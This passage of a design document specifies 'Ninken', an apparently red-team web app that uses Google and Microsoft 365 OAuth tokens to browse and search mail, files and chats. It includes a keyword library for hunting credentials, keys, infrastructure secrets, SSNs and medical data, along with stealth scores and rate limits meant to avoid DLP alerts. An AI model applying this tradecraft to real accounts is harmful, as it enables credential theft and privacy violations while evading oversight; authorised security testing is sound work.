| Private Keys | `BEGIN RSA PRIVATE`, `BEGIN OPENSSH PRIVATE`, `BEGIN EC PRIVATE`, `BEGIN PGP PRIVATE`, `BEGIN PRIVATE KEY` | Gmail, Drive, Buckets, OneDrive | SSH keys, TLS keys, PGP keys |
| JWT Secrets | `jwt_secret`, `JWT_SECRET`, `signing_key`, `HMAC_SECRET` | Gmail, Drive, Teams | JWT signing secrets |
| Database Connection Strings | `mongodb://`, `postgres://`, `mysql://`, `redis://`, `jdbc:`, `Server=`, `Data Source=` | Gmail, Drive, Buckets, Teams, OneDrive | Database URIs with embedded credentials |
| OAuth Tokens | `refresh_token`, `access_token`, `bearer`, `client_secret`, `client_id` | Gmail, Drive, Teams | OAuth tokens and app credentials |

**Category: Infrastructure & Config**

| Query Name | Search Terms | Target Services | What You Find |
|-----------|-------------|-----------------|---------------|
| Environment Files | `.env`, `env.production`, `env.staging`, `.env.local`, `dotenv` | Drive, Buckets, OneDrive | Environment variable files with secrets |
| Config Files | `config.yml`, `config.json`, `settings.json`, `application.properties`, `appsettings.json` | Drive, Buckets, OneDrive | App config with embedded secrets |
| Terraform | `terraform.tfstate`, `tfvars`, `.tf`, `terraform`, `backend.tf` | Drive, Buckets, OneDrive | Terraform state (contains ALL infra secrets), variable files |
| Kubernetes | `kubeconfig`, `.kube/config`, `kubectl`, `k8s`, `kubernetes secret` | Gmail, Drive, Buckets, Teams | K8s configs, cluster credentials |
| CI/CD | `github_token`, `GITHUB_TOKEN`, `CI_JOB_TOKEN`, `CIRCLE_TOKEN`, `JENKINS_`, `pipeline` | Gmail, Drive, Buckets, Teams | CI/CD pipeline tokens and configs |
| SSH Config | `ssh_config`, `known_hosts`, `authorized_keys`, `id_rsa`, `.ssh/` | Drive, Buckets, OneDrive | SSH infrastructure |
| VPN | `vpn`, `.ovpn`, `wireguard`, `ipsec`, `vpn password`, `VPN credentials` | Gmail, Drive, Teams, OneDrive | VPN configs and credentials |
| Network Diagrams | `network diagram`, `topology`, `architecture`, `subnet`, `CIDR`, `10.0.`, `192.168.`, `172.16.` | Drive, OneDrive, SharePoint | Internal network maps and IP ranges |

**Category: PII & Sensitive Data**

| Query Name | Search Terms | Target Services | What You Find |
|-----------|-------------|-----------------|---------------|
| Social Security Numbers | `SSN`, `social security`, `XXX-XX-XXXX` (regex) | Gmail, Drive, OneDrive | SSNs in HR docs, emails |
| Credit Cards | `credit card`, `card number`, `CVV`, `expir` | Gmail, Drive, Teams | Payment card data |
| Personal Documents | `passport`, `driver's license`, `birth certificate`, `SIN`, `tax return` | Gmail, Drive, OneDrive | Identity documents |
| Medical | `medical record`, `diagnosis`, `prescription`, `HIPAA`, `patient` | Gmail, Drive, OneDrive | Health information |
| Salary & Compensation | `salary`, `compensation`, `pay stub`, `bonus`, `stock option`, `offer letter` | Gmail, Drive, OneDrive | Financial/HR data |

**Category: Internal Access & Operations**

| Query Name | Search Terms | Target Services | What You Find |
|-----------|-------------|-----------------|---------------|
| Admin Panels | `admin panel`, `admin login`, `admin URL`, `dashboard URL`, `internal tool` | Gmail, Drive, Teams | Internal admin portal URLs |
| Incident Response | `incident`, `breach`, `compromised`, `forensic`, `IOC`, `indicator of compromise` | Gmail, Drive, Teams | Past security incidents, IR playbooks, IOCs |
| Onboarding | `onboarding`, `new hire`, `first day`, `welcome packet`, `here are your credentials` | Gmail, Drive, Teams | New employee credentials, system access grants |
| Offboarding | `offboarding`, `exit`, `account removal`, `revoke access`, `termination` | Gmail, Drive, Teams | Departing employee info, sometimes unrevoked credentials |
| M&A | `acquisition`, `merger`, `due diligence`, `NDA`, `confidential` | Gmail, Drive, OneDrive | M&A documents, financial details |
| Board / Exec | `board meeting`, `board deck`, `investor`, `quarterly results`, `earnings` | Gmail, Drive, OneDrive, SharePoint | Executive communications, financial results pre-disclosure |

**Query execution features:**

- **Parallel search**: queries run across all selected services simultaneously, results stream in as each service responds
- **Unified results view**: results from all services in a single scrollable view, grouped by service with collapsible sections
- **Result count per service**: badge showing hit count next to each service name
- **Click-through**: clicking a result opens it in Operate mode (email opens in Gmail view, file opens in Drive view, etc.)
- **Export results**: export all results as JSON/CSV with service, type, snippet, link, and timestamp
- **Query history**: last 20 queries saved, with result counts, for re-running
- **Custom queries**: save custom query strings to the library with a name, category, and description
- **Regex mode**: toggle regex matching for advanced patterns (e.g., `\b[A-Z0-9]{20}\b` for AWS key patterns)
- **Stealth score indicator**: shows the OPSEC stealth impact of running the query (e.g., searching Gmail is 5/5 Ghost, but searching many services with high-volume queries may attract attention from DLP/CASB)
- **Rate limiting**: configurable delay between API calls to avoid triggering rate limits or DLP alerts. Default: 100ms between requests
- **Scope check**: before running, validates that the loaded token(s) have the required scopes for each selected service. Grays out services the token can't access

**API routes:**
```
src/app/api/audit/query/route.ts         # POST: run query across services, returns unified results
src/app/api/audit/query/library/route.ts # GET: list query library, POST: save custom query
src/app/api/audit/query/history/route.ts # GET: query history
```

**Components:**
```
src/components/audit/query/
  query-bar.tsx                    # Main search input with service toggles
  query-library.tsx                # Pre-built query browser with categories
  query-library-card.tsx           # Individual query template card
  query-results.tsx                # Unified results view
  query-results-group.tsx          # Per-service result group (collapsible)
  query-result-item.tsx            # Individual result row (email, file, message, etc.)
  query-history.tsx                # Past queries with re-run option
  query-custom-save.tsx            # Save custom query dialog
  query-scope-check.tsx            # Token scope validation before search
```

**Data:**
```
src/lib/audit/
  query-library.ts                 # Pre-built query definitions (categories, terms, target services)
  query-engine.ts                  # Parallel multi-service search orchestrator
  query-adapters/
    gmail.ts                       # Gmail search adapter (q= parameter)
    drive.ts                       # Drive search adapter (fullText contains)
    buckets.ts                     # GCS object name prefix search
    calendar.ts                    # Calendar event search
    outlook.ts                     # Graph /messages?$search= adapter
    onedrive.ts                    # Graph /drive/search adapter
    sharepoint.ts                  # Graph /sites/search adapter
    teams.ts                       # Graph /chats/messages search adapter
```

#### Future Audit Modules (per service)

Each new service (GitHub, GitLab, Slack, M365, AWS) will get its own audit mode views following the same pattern: enumerate entities, map permissions, identify over-privileged accounts, visualize attack paths.

## Architecture

```
┌─────────────────────────────────────────────────────┐
│  Browser (React + shadcn/ui)                        │
│  ┌──────────┐ ┌──────────────┐ ┌──────────────────┐ │
│  │ Auth Page │ │  Gmail View  │ │   Drive View     │ │
│  │ (upload   │ │ (inbox,read, │ │ (browse,upload,  │ │
│  │ token.json│ │  compose,    │ │  download,share, │ │
│  │ drag&drop)│ │  thread,     │ │  preview,mkdir)  │ │
│  │           │ │  attachments,│ │                  │ │
│  │           │ │  SEARCH)     │ │  SEARCH)         │ │
│  └──────────┘ └──────────────┘ └──────────────────┘ │
│         │              │                │            │
│         ▼              ▼                ▼            │
│  ┌─────────────────────────────────────────────┐    │
│  │  Token stored in httpOnly cookie            │    │
│  └─────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────────┐
│  Next.js API Routes (/api/*)                        │
│  ┌────────────┐ ┌──────────────┐ ┌───────────────┐  │
│  │ /api/auth   │ │ /api/gmail/* │ │ /api/drive/*  │  │
│  │ POST/DELETE │ │ list,read,   │ │ list,info,    │  │
│  │ GET         │ │ send,reply,  │ │ download,     │  │
│  │             │ │ forward,     │ │ upload,search,│  │
│  │             │ │ attachments, │ │ mkdir,move,   │  │
│  │             │ │ trash,labels,│ │ copy,rename,  │  │
│  │             │ │ drafts,thread│ │ trash,delete, │  │
│  │             │ │ mark r/unread│ │ share,perms   │  │
│  └────────────┘ └──────────────┘ └───────────────┘  │
│         │              │                │            │
│  ┌─────────────────────────────────────────────┐    │
│  │  middleware.ts — auth check on all routes    │    │
│  │  Extracts token from cookie → OAuth2 client  │    │
│  └─────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────┘
          │
          ▼
    Google APIs (googleapis npm)        Microsoft Graph API (fetch)
    Gmail API v1 + Drive API v3         /me/messages, /me/drive, /users, etc.
```

## Tech Stack

| Layer | Technology |
|-------|-----------|
| Framework | Next.js 15 (App Router, TypeScript) |
| UI Components | shadcn/ui + Tailwind CSS v4 |
| Icons | lucide-react |
| Date formatting | date-fns |
| Google APIs | googleapis + google-auth-library (npm) |
| Microsoft Graph API | Direct fetch() to graph.microsoft.com — no SDK, custom client in `src/lib/microsoft.ts` |
| Auth storage | httpOnly cookie (active profile credentials), IndexedDB (all profiles via `src/lib/token-store.ts`) |
| Testing | Playwright MCP |

## Auth Flow

1. User opens app → landing page with drag-and-drop zone
2. User uploads `token.json` (from gcloud CLI or PLAYBOOK.md setup)
3. App validates JSON has: `refresh_token`, `client_id`, `client_secret`
   - Input methods: drag-and-drop file, file picker, OR paste JSON from clipboard (textarea toggle)
4. POST /api/auth → stores token in httpOnly cookie
5. Redirect to /gmail
6. All API routes read token from cookie → create OAuth2 client per request
7. "Sign out" → DELETE /api/auth → clears cookie → back to landing page

### Multi-Profile Support
Users can load multiple Google accounts (tokens) and switch between them instantly.

**How it works:**
1. On first visit, user uploads a token.json → becomes the active profile
2. In the top-right corner of the app (header/navbar), there's a **profile selector**:
   - Shows the active account email (fetched from /api/gmail/profile)
   - Dropdown with all loaded profiles (email + avatar initials)
   - "Add another account" option → opens the token upload dialog (file or paste)
   - Click a profile → switches the active token cookie → refreshes the page data
3. Profiles stored in an httpOnly cookie array or separate cookies (`workspace_token_0`, `workspace_token_1`, etc.)
4. Active profile index stored in a separate cookie or localStorage
5. Each profile shows: email, colored avatar initials
6. "Remove account" option per profile (removes from cookie, doesn't revoke the token)

**Key files:**
```
src/components/layout/profile-selector.tsx  # Dropdown in top-right
src/app/api/auth/route.ts                   # Updated: support multiple tokens
src/app/api/auth/profiles/route.ts          # GET: list profiles, POST: add, DELETE: remove
src/lib/auth.ts                             # Updated: multi-token cookie handling
```

**UI placement:**
- Top-right of the app layout (inside the (app) layout, visible on Gmail and Drive pages)
- Small avatar circle with initials → click → dropdown
- Dropdown: list of profiles, active one has checkmark, "Add account" at bottom
- Uses shadcn DropdownMenu + Avatar components

### Perpetual Token Refresh
The refresh token is the core of Ninken's persistence. On every API call:
1. OAuth2 client checks if access token is valid
2. If expired (access tokens last ~1 hour), it automatically uses the refresh token to get a new one
3. The new access token is used transparently — user never sees a re-auth prompt
4. This cycle repeats **indefinitely** — the refresh token itself does not expire

The user authenticates ONCE (when generating the token.json via gcloud CLI) and never again. The token.json can be used across devices, across time, without limits.

**Revocation scenarios** (only ways access stops):
- User revokes at https://myaccount.google.com/permissions
- Admin revokes via Google Workspace Admin Console
- OAuth client is deleted from the GCP project
- Token unused for 6+ months (Google's inactivity policy)
- Organization policy changes (e.g., new security restrictions)

## Token JSON Format

```json
{
  "token": "ya29.xxx (optional, auto-refreshes)",
  "refresh_token": "1//06Cvec... (required)",
  "client_id": "960873803545-xxx.apps.googleusercontent.com (required)",
  "client_secret": "GOCSPX-xxx (required)",
  "token_uri": "https://oauth2.googleapis.com/token (optional, has default)"
}
```

## Key Files

```
workspace-ui/
├── src/
│   ├── app/
│   │   ├── layout.tsx          # Root layout (providers, no sidebar)
│   │   ├── page.tsx            # Auth landing page (token upload, no sidebar)
│   │   ├── (app)/
│   │   │   ├── layout.tsx      # App layout WITH sidebar (Gmail/Drive nav, sign out)
│   │   │   ├── gmail/
│   │   │   │   └── page.tsx    # Gmail main view
│   │   │   └── drive/
│   │   │       └── page.tsx    # Drive main view
│   │   └── api/
│   │       ├── auth/
│   │       │   └── route.ts    # POST (store token), DELETE (clear), GET (check)
│   │       ├── gmail/
│   │       │   ├── messages/
│   │       │   │   └── route.ts      # GET list, POST send
│   │       │   ├── messages/[id]/
│   │       │   │   └── route.ts      # GET read, PATCH modify, DELETE trash
│   │       │   ├── messages/[id]/attachments/[attachmentId]/
│   │       │   │   └── route.ts      # GET download attachment
│   │       │   ├── threads/[id]/
│   │       │   │   └── route.ts      # GET thread
│   │       │   ├── labels/
│   │       │   │   └── route.ts      # GET list labels
│   │       │   └── drafts/
│   │       │       └── route.ts      # GET list, POST create, DELETE
│   │       └── drive/
│   │           ├── files/
│   │           │   └── route.ts      # GET list, POST upload
│   │           ├── files/[id]/
│   │           │   └── route.ts      # GET info, PATCH update, DELETE
│   │           ├── files/[id]/download/
│   │           │   └── route.ts      # GET download/export
│   │           ├── files/[id]/permissions/
│   │           │   └── route.ts      # GET list, POST create, DELETE
│   │           └── search/
│   │               └── route.ts      # GET search
│   ├── components/
│   │   ├── ui/                 # shadcn/ui components
│   │   ├── gmail/
│   │   │   ├── message-list.tsx
│   │   │   ├── message-view.tsx
│   │   │   ├── compose-dialog.tsx
│   │   │   ├── thread-view.tsx
│   │   │   ├── attachment-list.tsx
│   │   │   ├── label-sidebar.tsx
│   │   │   ├── toolbar.tsx
│   │   │   ├── search-bar.tsx          # Gmail search with query syntax
│   │   │   └── search-filters.tsx      # Advanced search popover
│   │   ├── drive/
│   │   │   ├── file-browser.tsx
│   │   │   ├── file-card.tsx
│   │   │   ├── upload-dialog.tsx
│   │   │   ├── share-dialog.tsx
│   │   │   ├── file-preview.tsx
│   │   │   ├── breadcrumbs.tsx
│   │   │   ├── context-menu.tsx
│   │   │   ├── search-bar.tsx          # Drive search with content search
│   │   │   └── search-filters.tsx      # Type/date/owner filter chips
│   │   ├── auth/
│   │   │   └── token-upload.tsx
│   │   └── layout/
│   │       ├── app-sidebar.tsx
│   │       └── theme-toggle.tsx
│   ├── lib/
│   │   ├── google.ts           # OAuth2 client factory (from token object)
│   │   ├── auth.ts             # Token type, cookie helpers
│   │   └── utils.ts            # shadcn utils
│   ├── hooks/
│   │   ├── use-gmail.ts        # Gmail API React hooks
│   │   └── use-drive.ts        # Drive API React hooks
│   └── proxy.ts                # Auth check (Next.js 16 uses proxy.ts, NOT middleware.ts)
├── public/
├── DESIGN.md                   # This file
├── package.json
└── tsconfig.json
```

## Task Breakdown & Status (as of 2026-03-19)

### COMPLETED
| Task | Agent | Notes |
|------|-------|-------|
| Scaffold Next.js + shadcn/ui | scaffolder | Next.js 16, proxy.ts (not middleware.ts) |
| Token upload/auth landing page | scaffolder | Drag-drop + paste JSON, httpOnly cookie |
| Gmail + Drive API routes (19 endpoints) | backend-api | All Gmail + Drive routes, shared _helpers.ts |
| Gmail UI components | gmail-ui | 8 hooks, 9 components, 3-column layout |
| Drive UI components | drive-ui | 12 hooks, 10 components, grid/list views |
| Audit Gmail code | auditor-gmail | Fixed: XSS (DOMPurify), MIME injection, Buffer.from, compose prefill bug, message parsing |
| Audit Drive code | auditor-drive | Fixed: query injection, header injection, field mismatches, a11y labels |
| Polish Gmail UI | polisher-gmail | Colored badges, animations, skeleton loading, typography |
| Polish Drive UI | polisher-drive | Color-coded icons, hover lift, sortable columns, slide-in preview |
| Integration review | integrator | Clean build, zero warnings, all security checks pass |
| Ninken rebrand | designer | SVG logo, kanji, favicon, dark default, stealth aesthetic |
| Drive E2E tests | tester-drive | Playwright tests |
| Microsoft 365 — Phase 1 | multi-agent | Full M365 provider: FOCI public client tokens, Graph API client (`src/lib/microsoft.ts`), ServiceProvider (`src/lib/providers/microsoft.ts`). Outlook (7 API routes, 3-panel email UI), OneDrive (5 routes, file browser), Teams (3 routes, 3-column UI), Entra ID (5 routes, tabbed Users/Groups/Roles), M365 Audit (1 route, dashboard + 4 sub-pages). Service switching via profile dropdown + `/?add=true`. Cookie size fix for large refresh tokens. |

### IN PROGRESS
| Task | Agent | Notes |
|------|-------|-------|
| Gmail E2E tests | tester-gmail | Playwright testing all Gmail features |
| Multi-profile + paste JSON + red palette | designer | Account switcher, color swap to black+red |

### TODO (Roadmap)
| Task | Priority |
|------|----------|
| Local cache + offline resilience (IndexedDB) | Next |
| Docker Compose containerization | Next |
| GCP Buckets (Cloud Storage) explorer | v1.0 |
| GitHub module (PAT → repos, issues, PRs, secrets) | v3.0 |
| GitLab module (PAT → projects, MRs, CI/CD, secrets) | v3.0 |
| Slack module (token → channels, messages, files) | v4.0 |
| Microsoft 365 — Phase 2: PRT, browser session cookies, advanced token flows, SharePoint | v4.1 |
| NinLoader — universal token collector CLI (Python + PowerShell), service-agnostic plugin architecture | v4.2 |
| Studio module — multi-platform Token Analyzer, Service Map, Extraction Guide, Converter, OPSEC Stealth Scores, Scope Calculator (Google + Microsoft + future platforms) | v4.3 |
| AWS module (access key → S3, IAM, Lambda, Secrets Manager) | v5.0 |
| Custom REST API explorer | v6.0 |
| Credential auto-detection (paste anything, Ninken detects type) | v3.0 |
| Audit Query — cross-service keyword search with pre-built red team query library (credentials, API keys, PII, infra) | v3.0 |
| Cross-service search and data export | v4.0 |

## Agent Team

| Agent | Role | Tasks |
|-------|------|-------|
| scaffolder | Project setup, auth flow, sidebar layout | #2, #6 |
| backend-api | All API routes (Gmail + Drive) | #5 |
| gmail-ui | Gmail inbox, compose, thread, attachments UI | #1 |
| drive-ui | Drive browser, upload, share, preview UI | #4 |
| tester | Playwright MCP E2E tests | #3 |

## Gmail UI Features

### Sidebar
- Label navigation: Inbox, Starred, Sent, Drafts, Trash, custom labels
- Unread count badges
- Compose button (opens dialog)

### Message List
- Sender avatar (initials)
- Subject + snippet preview
- Date (relative: "2h ago", "Yesterday", "Mar 15")
- Attachment paperclip icon
- Star toggle
- Unread bold styling
- Checkbox for bulk actions
- Search bar with Gmail query syntax

### Message View
- Full headers (From, To, Cc, Date, Subject)
- Labels as badges
- HTML body rendering (sanitized)
- Attachment cards with download buttons + file type icons
- Reply / Forward / Trash toolbar
- Thread view (expand/collapse individual messages)

### Search (Gmail)
- Persistent search bar at top of Gmail view (like Gmail's)
- Supports full Gmail query syntax: `from:`, `to:`, `subject:`, `has:attachment`, `is:unread`, `newer_than:`, `older_than:`, `label:`, `filename:`, `larger:`, `in:sent`, etc.
- Search suggestions dropdown with common filters as chips/buttons:
  - "is:unread", "has:attachment", "is:starred", "in:sent"
- Debounced search (300ms) — results replace the message list
- Clear search button to return to inbox
- Show result count ("42 results for ...")
- Highlight matching query in results (bold sender/subject matches)
- Advanced search popover with fields: From, To, Subject, Has words, Date range, Has attachment toggle, Size filter
- Search history (last 5 searches stored in localStorage)

### Compose Dialog
- To, Cc, Bcc fields (with toggle for Cc/Bcc)
- Subject line
- Rich text body (textarea)
- Attach files button
- Send / Save Draft / Discard buttons

## Drive UI Features

### File Browser
- Grid view (cards) and List view (table) toggle
- Breadcrumb navigation (My Drive > Folder > Subfolder)
- Sort by name, date modified, size
- File type icons (doc, sheet, slide, pdf, image, folder, etc.)
- Shared indicator
- Right-click context menu

### File Card / Row
- File type icon (color-coded)
- Name, modified date, size
- Shared badge
- Star toggle
- Quick actions (download, share, trash)

### Upload
- Drag-and-drop zone overlay
- File picker button
- Upload progress indicator
- Target folder selector

### Share Dialog
- Add people by email
- Role picker (Viewer, Commenter, Editor)
- Current permissions list
- Remove permission
- Copy link button
- Domain/anyone sharing options

### File Preview
- Side panel showing file details
- Preview for images, PDFs
- Metadata: name, type, size, created, modified, owner
- Direct link to Google Docs/Sheets/Slides

### Search (Drive)
- Persistent search bar at top of Drive view
- Full-text content search across all files (uses Drive API `fullText contains`)
- Type filter chips below search bar:
  - All, Documents, Spreadsheets, Presentations, PDFs, Images, Folders, Videos
- Filter toggles: "Shared with me", "Starred", "Trashed"
- Date range filter (modified after/before)
- Owner filter (owned by me, shared with me, anyone)
- Debounced search (300ms)
- Results show file name, type icon, location (parent folder), modified date, owner
- Click result opens file info / navigates to folder
- Clear search returns to current folder view
- Search history (last 5 searches in localStorage)
- Empty state with illustration when no results

## API Routes Reference

### Auth
| Method | Route | Description |
|--------|-------|-------------|
| POST | /api/auth | Store token (body: token JSON) |
| GET | /api/auth | Check auth status |
| DELETE | /api/auth | Clear token (sign out) |

### Gmail
| Method | Route | Description |
|--------|-------|-------------|
| GET | /api/gmail/messages?q=&limit= | List messages |
| POST | /api/gmail/messages | Send message |
| GET | /api/gmail/messages/[id] | Read message |
| PATCH | /api/gmail/messages/[id] | Modify (labels, read/unread) |
| DELETE | /api/gmail/messages/[id] | Trash message |
| POST | /api/gmail/messages/[id]/untrash | Restore from trash |
| GET | /api/gmail/messages/[id]/attachments/[aid] | Download attachment |
| GET | /api/gmail/threads/[id] | Get thread |
| GET | /api/gmail/labels | List labels |
| GET | /api/gmail/drafts | List drafts |
| POST | /api/gmail/drafts | Create draft |
| POST | /api/gmail/drafts/[id]/send | Send draft |
| DELETE | /api/gmail/drafts/[id] | Delete draft |
| GET | /api/gmail/profile | Account profile |
| GET | /api/gmail/search?q=&limit= | Search messages (Gmail query syntax) |

### Drive
| Method | Route | Description |
|--------|-------|-------------|
| GET | /api/drive/files?q=&limit=&folder= | List files |
| POST | /api/drive/files | Upload file |
| GET | /api/drive/files/[id] | File info |
| PATCH | /api/drive/files/[id] | Update (rename, move, trash) |
| DELETE | /api/drive/files/[id] | Permanent delete |
| GET | /api/drive/files/[id]/download?format= | Download/export |
| POST | /api/drive/files/mkdir | Create folder |
| POST | /api/drive/files/[id]/copy | Copy file |
| GET | /api/drive/files/[id]/permissions | List permissions |
| POST | /api/drive/files/[id]/permissions | Share file |
| DELETE | /api/drive/files/[id]/permissions/[pid] | Remove permission |
| GET | /api/drive/search?term=&type= | Search files |

## Portability

The app is fully portable:
1. Copy the `workspace-ui/` folder + `token.json` to any machine
2. `npm install && npm run dev`
3. Open browser → upload token.json → done

Or deploy to Vercel/any host — users just upload their own token.json.

## Local Cache & Offline Resilience

The app caches viewed content locally so reopening items doesn't hit the network, and the app can survive brief disconnections (a few minutes offline).

### Implementation: `src/lib/cache.ts`

Uses a combination of **IndexedDB** (for large data like message bodies, attachments, file metadata) and **localStorage** (for lightweight state like search history, UI preferences).

### What Gets Cached

| Data | Storage | TTL | Max Size |
|------|---------|-----|----------|
| Gmail message list (per label/query) | IndexedDB | 5 min | Last 200 messages |
| Gmail message body (full, per ID) | IndexedDB | 30 min | Last 100 messages |
| Gmail attachments (downloaded) | IndexedDB | 1 hour | Last 50 files, 100MB max |
| Gmail labels + unread counts | IndexedDB | 5 min | All |
| Gmail profile | IndexedDB | 1 hour | 1 |
| Drive file list (per folder) | IndexedDB | 5 min | Last 500 files |
| Drive file metadata (per ID) | IndexedDB | 30 min | Last 200 files |
| Drive downloaded files | IndexedDB | 1 hour | Last 20 files, 200MB max |
| Drive folder tree / breadcrumbs | IndexedDB | 10 min | Full tree |
| Search history | localStorage | forever | Last 5 per service |
| UI state (view mode, sort order) | localStorage | forever | — |

### Cache Strategy

1. **Stale-While-Revalidate**: Show cached data immediately, fetch fresh data in background, update UI when ready
2. **Cache-First for opened items**: If a message/file was already viewed, serve from cache instantly — no loading spinner
3. **Network-First for lists**: Always try to fetch fresh list, fall back to cache if offline
4. **Write-Through**: Actions (send, trash, label changes) are queued if offline and replayed when connection returns

### Offline Behavior

- **Reading**: All previously viewed messages and files are available offline
- **Composing**: Drafts are saved locally and synced when back online
- **Actions queue**: Trash, mark read/unread, label changes are queued locally
- **Visual indicator**: Show a subtle banner "Offline — showing cached data" when disconnected
- **Auto-reconnect**: Poll every 10s when offline, auto-sync when connection returns
- **Conflict resolution**: Server wins — if an action conflicts (e.g., message was deleted server-side), show a toast notification

### Cache Key Structure

```
gmail:messages:list:{label}:{query}:{page}
gmail:messages:{messageId}
gmail:messages:{messageId}:attachments:{attachmentId}
gmail:labels
gmail:profile
drive:files:list:{folderId}:{query}:{page}
drive:files:{fileId}
drive:files:{fileId}:content
drive:search:{query}:{type}
```

### Cache Management

- Auto-evict when storage exceeds limits (LRU eviction)
- "Clear cache" option in settings / sidebar
- Cache size indicator in footer (e.g., "Cache: 12.4 MB")
- On sign out: all cached data is cleared

### Key Files

```
src/lib/cache.ts         # IndexedDB wrapper, TTL logic, LRU eviction
src/hooks/use-cached.ts  # React hook: useCachedQuery(key, fetcher, ttl)
src/lib/offline-queue.ts # Queue for offline write actions
src/components/layout/
  offline-banner.tsx     # "Offline" indicator banner
```

## Design Principles

- **Beautiful**: Modern, polished UI that rivals Gmail/Drive — not a generic admin panel
- **Portable**: Runs anywhere with just Node.js + a token.json
- **Secure**: Token in httpOnly cookie, never exposed to client JS
- **Fast**: Client-side navigation, optimistic updates, skeleton loading states, **local cache for instant reopens**
- **Offline-resilient**: Cached content available offline, actions queued and replayed on reconnect
- **Complete**: All major Gmail/Drive operations supported

## OAuth Scopes Required

- `gmail.modify` — read, send, delete, manage email and labels
- `gmail.compose` — create drafts and send email
- `gmail.send` — send email on behalf of user
- `gmail.readonly` — read-only email access
- `drive` — full Drive access (read, write, delete, share)

## Containerization (Docker Compose)

### Dockerfile

```dockerfile
FROM node:22-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

FROM node:22-alpine AS runner
WORKDIR /app
ENV NODE_ENV=production
COPY --from=builder /app/.next/standalone ./
COPY --from=builder /app/.next/static ./.next/static
COPY --from=builder /app/public ./public
EXPOSE 3000
CMD ["node", "server.js"]
```

### docker-compose.yml

```yaml
version: "3.9"
services:
  workspace-ui:
    build: .
    ports:
      - "3000:3000"
    environment:
      - NODE_ENV=production
    restart: unless-stopped
    healthcheck:
      test: ["CMD", "wget", "--spider", "-q", "http://localhost:3000/api/auth"]
      interval: 30s
      timeout: 5s
      retries: 3
```

### next.config.ts addition

```ts
output: "standalone"  // Required for Docker slim builds
```

### Usage

```bash
# Build and run
docker compose up -d

# Rebuild after changes
docker compose up -d --build

# View logs
docker compose logs -f workspace-ui

# Stop
docker compose down
```

### Deploy anywhere

```bash
# Copy to remote server
scp -r workspace-ui/ user@server:~/workspace-ui/
ssh user@server "cd workspace-ui && docker compose up -d"
```

No token.json file needed on the server — users upload via the browser UI.

### Key Files

```
workspace-ui/
├── Dockerfile
├── docker-compose.yml
├── .dockerignore         # node_modules, .next, .git, *.md
└── next.config.ts        # output: "standalone"
```

## Phase 3: Perfection Sprint (Multi-Team Agent Swarm)

After all features are built, we launch a final "perfection phase" with multiple specialized agent teams working in parallel. Each team has a focused mission.

### Team 1: Code Auditors (2 agents)
- **auditor-gmail**: Reviews ALL Gmail code (API routes + UI components + hooks)
  - Check for: missing error handling, uncaught exceptions, edge cases
  - Verify: all API routes return proper HTTP status codes
  - Check: proper TypeScript types, no `any` types
  - Verify: consistent patterns across all routes
  - Look for: security issues (XSS in HTML email rendering, injection in search queries)
  - Check: proper loading/error states in all UI components

- **auditor-drive**: Reviews ALL Drive code (API routes + UI components + hooks)
  - Same checklist as above, applied to Drive
  - Extra: verify file upload handles large files, check download streams properly
  - Check: share dialog handles all permission types correctly
  - Verify: breadcrumb navigation doesn't break on deep paths

### Team 2: UI/UX Polishers (2 agents)
- **polisher-gmail**: Takes screenshots via Playwright MCP, evaluates visual quality
  - Check: consistent spacing, alignment, typography
  - Verify: dark mode looks great (not just "works")
  - Check: empty states, loading skeletons, error states
  - Fix: any visual inconsistencies, janky transitions
  - Ensure: responsive design works on different viewport sizes
  - Make it BEAUTIFUL — not generic

- **polisher-drive**: Same for Drive views
  - Check: file type icons are distinct and color-coded
  - Verify: grid/list views both look polished
  - Check: context menus, dialogs, share panel
  - Fix: upload drag-and-drop visual feedback
  - Ensure: breadcrumbs + search + filters all look cohesive

### Team 3: Integration Testers (2 agents using Playwright MCP)
- **tester-gmail**: End-to-end testing of ALL Gmail functionality
  - Start app, upload token.json via auth page
  - Test: inbox loads, messages display correctly
  - Test: click message → detail view with headers, body, attachments
  - Test: download attachment
  - Test: compose new email (fill fields, attach file, send)
  - Test: reply to message
  - Test: forward message
  - Test: trash message, restore from trash
  - Test: mark read/unread
  - Test: star/unstar
  - Test: label management
  - Test: search with query, clear search
  - Test: advanced search filters
  - Test: draft create, list, send, delete
  - Test: thread view
  - Test: pagination
  - Take screenshots at every step for evidence

- **tester-drive**: End-to-end testing of ALL Drive functionality
  - Test: file list loads, grid and list view toggle
  - Test: navigate into folder, breadcrumbs update
  - Test: search files, type filter chips
  - Test: upload file (drag-and-drop + file picker)
  - Test: download file (regular + Google Docs export)
  - Test: create folder
  - Test: rename file
  - Test: move file to folder
  - Test: copy file
  - Test: share file (user, anyone, domain)
  - Test: view permissions, remove permission
  - Test: trash file, restore from trash
  - Test: permanent delete with confirmation
  - Test: file info panel
  - Take screenshots at every step for evidence

### Team 4: Cross-Cutting Concerns (1 agent)
- **integrator**: Checks everything works together
  - Auth flow: upload token → redirect → sidebar works → sign out → back to auth
  - Navigation: Gmail ↔ Drive switching preserves state
  - Token expiry: handles refresh token flow gracefully
  - Error states: what happens when API returns 500? Network timeout?
  - Cookie size: verify token fits in cookie (4KB limit)
  - Build: clean production build, no warnings
  - Performance: no unnecessary re-renders, no memory leaks
  - Accessibility: keyboard navigation, focus management, aria labels
  - Consistency: same patterns in Gmail and Drive (hooks, error handling, loading states)

### Execution Order
```
Phase 1 (current): Build features
  #2 Scaffold ✅ → #6 Auth ✅ → #5 API routes → #1 Gmail UI → #4 Drive UI

Phase 2: Polish
  #7 Local cache → #8 Docker

Phase 3: Perfection Sprint (all teams in parallel)
  Team 1: auditor-gmail + auditor-drive (code review + fixes)
  Team 2: polisher-gmail + polisher-drive (visual QA + fixes)
  Team 3: tester-gmail + tester-drive (Playwright E2E tests)
  Team 4: integrator (cross-cutting, consistency, a11y)

  → All teams report findings → fixes applied → re-test → ship
```

## Generating token.json

See `/Users/mvpenha/code/gcloud/PLAYBOOK.md` for full instructions. Quick version:

```bash
gcloud auth application-default login \
  --client-id-file=client_secret.json \
  --scopes="https://www.googleapis.com/auth/gmail.modify,https://www.googleapis.com/auth/gmail.compose,https://www.googleapis.com/auth/gmail.send,https://www.googleapis.com/auth/gmail.readonly,https://www.googleapis.com/auth/drive"
```

Then format the output as token.json with: refresh_token, client_id, client_secret.

---

## Roadmap — v1.1+

### Drive Enhancements
